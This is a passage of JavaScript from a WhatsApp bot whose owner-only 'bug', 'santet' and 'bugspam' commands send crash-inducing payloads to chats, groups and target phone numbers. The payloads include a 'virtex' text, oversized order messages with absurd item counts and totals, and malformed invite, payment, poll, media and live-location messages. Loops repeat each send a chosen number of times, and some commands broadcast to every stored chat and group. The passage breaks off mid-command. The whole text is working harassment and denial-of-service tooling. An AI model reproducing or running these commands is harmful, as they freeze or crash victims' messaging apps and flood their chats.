const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
atak.sendKatalog(from, virtex8, virtex8, ofrply, {quoted: setQuotedBug })
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
break
case 'bugbutton':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner()
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
const buttons = [
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv1}, type: 1},
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv2}, type: 1},
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv3}, type: 1}
]
atak.sendButMessage(from, `TURU DEKK 🥶`, fake, buttons, setQuotedBug)
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
break
case 'bugtag':{
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
let member = participants.map(u => u.id)
let org = member[Math.floor(Math.random() * member.length)]
atak.sendMessage(from, { text : `@${org.split("@")[0]}`, mentions: [org]}, { quoted: setQuotedBug })
}
break
case 'bugtagall':{
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
let teks = `${virtex8}\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
atak.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: setQuotedBug })
}
break
case 'bugpc': 
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
var facahjs = await store.chats.all()
for (let i of facahjs) {
await atak.sendMessage(i.id, { text: `TURU DECK 🥶` }, {quoted: setQuotedBug})
await sleep(1000)
}
break
case 'buggc':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
let ygcx = groupss.map(v => v.id)
for (let i of ygcx) {
await atak.sendMessage(i, {text: `TURU DECK 🥶`}, { quoted: setQuotedBug })
await delay(1000)
}
break
case 'bugspam':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
var bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var buginvite = generateWAMessageFromContent(from ,{"groupInviteMessage": {"groupJid": "6283144394823@g.us","inviteCode": "UkJdqTXupAtmDwo4","inviteExpiration": "1643553084","invitetime": "1643293887000","groupName": virtex8,"thumbnail": ofrply,"caption": virtex8, "contextInfo": { "forwardingScore": 150, "isForwarded": true }}}, { quoted: setQuotedBug }) 
var requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "100","noteMessage": {"extendedTextMessage": {"text": virtex8,}}}}), { userJid: from, quoted: setQuotedBug })
var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({"pollCreationMessage": {"name": "HALO DEKK 🥶", "options": [{"optionName": "VOTE YUK"}, {"optionName": "BERANI VOTE GK"}, {"optionName": "VOTE LAH SEMUA"}, {"optionName": "KATANYA WA KEBAL"}, {"optionName": "SALAM CREATOR BOT"}], "selectableOptionsCount": 5 }}), { userJid: from, quoted: setQuotedBug })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: atak.waUploadToServer })
var order = generateWAMessageFromContent(from, proto.Message.fromObject({"orderMessage": {"orderId": "594071395007984","orderImage": messa.imageMessage,"itemCount": 100000000000,"status": "INQUIRY","surface": "CATALOG","message": virtex8,"jpegThumbnail": ofrply,"orderTitle": virtex8,"sellerJid": "6287721317870@s.whatsapp.net","token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==","totalAmount1000": "500000000000000","totalCurrencyCode": "IDR",}}), { userJid: from, quoted: setQuotedBug })
var audio = generateWAMessageFromContent(from, proto.Message.fromObject({"audioMessage": {"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc","mimetype": "audio/mpeg","fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=","fileLength": "258330","seconds": 16,"ptt": false,"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=","fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=","directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118","mediaKeyTimestamp": "1657190832",}}), { userJid: from, quoted: setQuotedBug })
var image = generateWAMessageFromContent(from, proto.Message.fromObject({"imageMessage": {"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc","mimetype": "image/jpeg","caption": virtex8,"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=","fileLength": "42521","height": 426,"width": 640,"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=","fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=","directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1","mediaKeyTimestamp": "1657286523","jpegThumbnail": messa.imageMessage,}}), { userJid: from, quoted: setQuotedBug })
var document = generateWAMessageFromContent(from, proto.Message.fromObject({"documentMessage": {"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc","mimetype": "application/octet-stream","title": ".ridho","fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=","pageCount": 0,"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=","fileName": virtex8,"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=","directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5","mediaKeyTimestamp": "1657288637",}}), { userJid: from, quoted: setQuotedBug })
var sticker = generateWAMessageFromContent(from, proto.Message.fromObject({"stickerMessage": {"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc","fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=","fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=","mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781","fileLength": "7774","mediaKeyTimestamp": "1657290167","isAnimated": false,}}), { userJid: from, quoted: setQuotedBug })
var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({"liveLocationMessage": {"degreesLatitude": -6.9367014,"degreesLongitude": 107.7228574,"caption": virtex8,"sequenceNumber": "1657237469254001","jpegThumbnail": messa.imageMessage,}}), { userJid: from, quoted: setQuotedBug })
const buttons = [
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv1}, type: 1},
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv2}, type: 1},
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv3}, type: 1}
]
atak.relayMessage(from, buginvite.message, { messageId: buginvite.key.id,})	
atak.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
atak.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
atak.relayMessage(from, order.message, { messageId: order.key.id })
atak.relayMessage(from, audio.message, { messageId: audio.key.id })
atak.relayMessage(from, image.message, { messageId: image.key.id })
atak.relayMessage(from, document.message, { messageId: document.key.id })
atak.relayMessage(from, liveLocation.message, { messageId: liveLocation.key.id })
atak.relayMessage(from, sticker.message, { messageId: sticker.key.id })
atak.sendButMessage(from, `TURU DEKK 🥶`, fake, buttons, setQuotedBug)
atak.sendKatalog(from, virtex8, virtex8, ofrply, {quoted: setQuotedBug })
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
break
case 'bugsanted':
case 'bugsantet':
case 'santet':
case 'santed':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
require("../lib/santed.js")(atak, ridho, Input, mentionByTag, mentionByReply, isGroup, setQuotedBug, ownerNumber, args, delay, isNaN, setReply, command)
break
case 'santedgc':
case 'santetgc':
case 'bugsantedgc':
case 'bugsantetgc':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply("id gcnya?") 
require("../lib/santed_gc.js")(atak, ridho, setQuotedBug, args, delay, isNaN, q, setReply, command) 
break
case 'buginvitev':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner()
if (!q) return setReply(`Jumlahnya?`) 
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
let buginvite = generateWAMessageFromContent(from ,{
"groupInviteMessage": {
"groupJid": "6283144394823@g.us",
"inviteCode": "UkJdqTXupAtmDwo4",
"inviteExpiration": "1643553084",
"invitetime": "1643293887000",
"groupName": virtex8,
"thumbnail": ofrply,           
"caption": virtex8,
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}, { quoted: setQuotedBug }) 
atak.relayMessage(from, buginvite.message, { messageId: buginvite.key.id,})	
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
break
case 'bugpaymentv':
case 'bugpayv':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner()
if (!q) return setReply(`Jumlahnya?`) 
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"noteMessage": {
"extendedTextMessage": {
"text": virtex8,
}
}}}), { userJid: from, quoted: setQuotedBug })
atak.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
break
case 'bugpollingv':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner()
if (!q) return setReply(`Jumlahnya?`) 
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO DEKK 🥶", 
"options": [
   {
"optionName": "VOTE YUK"
   }, 
   {
"optionName": "BERANI VOTE GK"
   }, 
   {
"optionName": "VOTE LAH SEMUA"
   }, 
   {
"optionName": "KATANYA WA KEBAL"
   }, 
   {
"optionName": "SALAM CREATOR BOT"
   }
], 
"selectableOptionsCount": 5
  }
}), { userJid: from, quoted: setQuotedBug })
atak.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
break
case 'bugtroliv': {
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply(`Jumlahnya?`) 
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: atak.waUploadToServer })
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "594071395007984",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": virtex8,
"jpegThumbnail": ofrply,
"orderTitle": virtex8,
"sellerJid": "6287721317870@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: from, quoted: setQuotedBug })
atak.relayMessage(from, order.message, { messageId: order.key.id })
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
break
case 'bugaudiov': {
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply(`Jumlahnya?`) 
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var audio = generateWAMessageFromContent(from, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
"fileLength": "258330",
"seconds": 16,
"ptt": false,
"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
"mediaKeyTimestamp": "1657190832",
}
}), { userJid: from, quoted: setQuotedBug })
atak.relayMessage(from, audio.message, { messageId: audio.key.id })
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
break
case 'bugimagev': {
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply(`Jumlahnya?`) 
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: atak.waUploadToServer })
var image = generateWAMessageFromContent(from, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
"mimetype": "image/jpeg",
"caption": virtex8,
"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
"fileLength": "42521",
"height": 426,
"width": 640,
"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=",
"fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=",
"directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1",
"mediaKeyTimestamp": "1657286523",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted: setQuotedBug })
atak.relayMessage(from, image.message, { messageId: image.key.id })
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
break
case 'bugdocumentv':
case 'bugdocv': {
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply(`Jumlahnya?`) 
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: atak.waUploadToServer })
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "application/octet-stream",
"title": ".ridho",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": virtex8,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: from, quoted: setQuotedBug })
atak.relayMessage(from, document.message, { messageId: document.key.id })
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
break
case 'bugstickerv':
case 'bugstickv': {
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply(`Jumlahnya?`) 
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var sticker = generateWAMessageFromContent(from, proto.Message.fromObject({
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}), { userJid: from, quoted: setQuotedBug })
atak.relayMessage(from, sticker.message, { messageId: sticker.key.id })
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
break
case 'buglokasiv': {
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply(`Jumlahnya?`) 
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: atak.waUploadToServer })
var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": virtex8,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted: setQuotedBug })
atak.relayMessage(from, liveLocation.message, { messageId: liveLocation.key.id })
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
break
case 'bugkatalogv':
case 'bugcatalogv':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply(`Jumlahnya?`) 
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
atak.sendKatalog(from, virtex8, virtex8, ofrply, {quoted: setQuotedBug })
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
break
case 'bugbuttonv':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner()
if (!q) return setReply(`Jumlahnya?`) 
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
const buttons = [
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv1}, type: 1},
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv2}, type: 1},
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv3}, type: 1}
]
atak.sendButMessage(from, `TURU DEKK 🥶`, fake, buttons, setQuotedBug)
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
break
case 'bugtagv':{
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply(`Jumlahnya?`) 
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
let member = participants.map(u => u.id)
let org = member[Math.floor(Math.random() * member.length)]
atak.sendMessage(from, { text : `@${org.split("@")[0]}`, mentions: [org]}, { quoted: setQuotedBug })
}
}
break
case 'bugtagallv':{
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply(`Jumlahnya?`) 
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
let teks = `${virtex8}\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
}
atak.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: setQuotedBug })
}
break
case 'bugpcv': {
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply(`Jumlahnya?`) 
if (isNaN(q)) return setReply(`Harus berupa angka`)
var facahjs = await store.chats.all()
for (let i of facahjs) {
for (let i = 0; i < args[0]; i++) {
await atak.sendMessage(i.id, { text: `TURU DECK 🥶` }, {quoted: setQuotedBug})
await sleep(1000)
}
}
}
break
case 'buggcv':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply(`Jumlahnya?`) 
if (isNaN(q)) return setReply(`Harus berupa angka`)
let ygcx = groupss.map(v => v.id)
for (let i of ygcx) {
for (let i = 0; i < args[0]; i++) {
await atak.sendMessage(i, {text: `TURU DECK 🥶`}, { quoted: setQuotedBug })
await delay(1000)
}
}
}
break
case 'bugspamv':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply(`Jumlahnya?`) 
if (isNaN(q)) return setReply(`Harus berupa angka`)
var bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var buginvite = generateWAMessageFromContent(from ,{"groupInviteMessage": {"groupJid": "6283144394823@g.us","inviteCode": "UkJdqTXupAtmDwo4","inviteExpiration": "1643553084","invitetime": "1643293887000","groupName": virtex8,"thumbnail": ofrply,"caption": virtex8, "contextInfo": { "forwardingScore": 150, "isForwarded": true }}}, { quoted: setQuotedBug }) 
var requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "100","noteMessage": {"extendedTextMessage": {"text": virtex8,}}}}), { userJid: from, quoted: setQuotedBug })
var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({"pollCreationMessage": {"name": "HALO DEKK 🥶", "options": [{"optionName": "VOTE YUK"}, {"optionName": "BERANI VOTE GK"}, {"optionName": "VOTE LAH SEMUA"}, {"optionName": "KATANYA WA KEBAL"}, {"optionName": "SALAM CREATOR BOT"}], "selectableOptionsCount": 5 }}), { userJid: from, quoted: setQuotedBug })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: atak.waUploadToServer })
var order = generateWAMessageFromContent(from, proto.Message.fromObject({"orderMessage": {"orderId": "594071395007984","orderImage": messa.imageMessage,"itemCount": 100000000000,"status": "INQUIRY","surface": "CATALOG","message": virtex8,"jpegThumbnail": ofrply,"orderTitle": virtex8,"sellerJid": "6287721317870@s.whatsapp.net","token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==","totalAmount1000": "500000000000000","totalCurrencyCode": "IDR",}}), { userJid: from, quoted: setQuotedBug })
var audio = generateWAMessageFromContent(from, proto.Message.fromObject({"audioMessage": {"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc","mimetype": "audio/mpeg","fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=","fileLength": "258330","seconds": 16,"ptt": false,"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=","fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=","directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118","mediaKeyTimestamp": "1657190832",}}), { userJid: from, quoted: setQuotedBug })
var image = generateWAMessageFromContent(from, proto.Message.fromObject({"imageMessage": {"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc","mimetype": "image/jpeg","caption": virtex8,"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=","fileLength": "42521","height": 426,"width": 640,"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=","fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=","directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1","mediaKeyTimestamp": "1657286523","jpegThumbnail": messa.imageMessage,}}), { userJid: from, quoted: setQuotedBug })
var document = generateWAMessageFromContent(from, proto.Message.fromObject({"documentMessage": {"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc","mimetype": "application/octet-stream","title": ".ridho","fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=","pageCount": 0,"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=","fileName": virtex8,"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=","directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5","mediaKeyTimestamp": "1657288637",}}), { userJid: from, quoted: setQuotedBug })
var sticker = generateWAMessageFromContent(from, proto.Message.fromObject({"stickerMessage": {"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc","fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=","fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=","mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781","fileLength": "7774","mediaKeyTimestamp": "1657290167","isAnimated": false,}}), { userJid: from, quoted: setQuotedBug })
var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({"liveLocationMessage": {"degreesLatitude": -6.9367014,"degreesLongitude": 107.7228574,"caption": virtex8,"sequenceNumber": "1657237469254001","jpegThumbnail": messa.imageMessage,}}), { userJid: from, quoted: setQuotedBug })
const buttons = [
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv1}, type: 1},
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv2}, type: 1},
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv3}, type: 1}
]
for (let i = 0; i < args[0]; i++) {
atak.relayMessage(from, buginvite.message, { messageId: buginvite.key.id,})	
